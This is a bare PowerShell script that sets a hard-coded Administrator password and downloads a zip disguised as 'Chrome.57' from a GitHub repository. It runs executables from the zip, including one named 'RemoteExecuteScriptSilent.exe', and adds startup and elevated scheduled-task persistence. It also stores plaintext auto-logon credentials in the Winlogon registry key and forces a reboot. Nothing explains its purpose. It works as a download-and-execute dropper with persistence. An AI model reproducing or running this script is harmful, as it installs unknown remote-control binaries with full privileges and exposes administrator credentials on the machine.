Set-ExecutionPolicy RemoteSigned -Force
net user Administrator Nancyhd1@
$Url = 'https://github.com/37218vuuhuu/app-19/raw/main/Chrome.57.zip'

[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"

$ProgressPreference = 'SilentlyContinue'

Invoke-WebRequest $Url -OutFile Chrome.57.zip

Expand-Archive Chrome.57.zip -DestinationPath Chrome.57
Start "C:\Users\Administrator\Chrome.57\Shutdown.exe"
Set-ExecutionPolicy RemoteSigned -Force
$SourceFilePath = "C:\Users\Administrator\Chrome.57\RemoteExecuteScriptSilent.exe" 
$ShortcutPath = "C:\Users\Administrator\Start Menu\Programs\Startup\RemoteExecuteScriptSilent.lnk" 
$WScriptObj = New-Object -ComObject ("WScript.Shell") 
$shortcut = $WscriptObj.CreateShortcut($ShortcutPath) 
$shortcut.TargetPath = $SourceFilePath 
$shortcut.WindowStyle = 1 
$ShortCut.Hotkey = "F1"; $shortcut.Save()

$Action=New-ScheduledTaskAction -Execute "powershell.exe"
$Trigger=New-ScheduledTaskTrigger -AtLogOn
$Set=New-ScheduledTaskSettingsSet
$Principal=New-ScheduledTaskPrincipal -UserID "$env:username" -LogonType Interactive -RunLevel Highest
$Task=New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Set -Principal $Principal
Register-ScheduledTask -TaskName PowerShellAtLogon -InputObject $Task

$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$DefaultUsername = "Administrator"
$DefaultPassword = "Nancyhd1@"
Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String 
Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
Get-PSReadLineKeyHandler -Chord Enter
Shutdown -r -t 120 /f
